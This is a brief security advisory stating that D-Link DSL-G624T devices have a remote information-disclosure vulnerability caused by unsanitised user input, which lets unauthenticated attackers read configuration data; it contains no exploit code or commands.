D-Link DSL-G624T devices are prone to a remote information-disclosure vulnerability because the devices fail to properly sanitize user-supplied input.

Exploiting this issue allows remote, unauthenticated attackers to gain access to potentially sensitive configuration information from affected devices. This may aid them in further attacks.
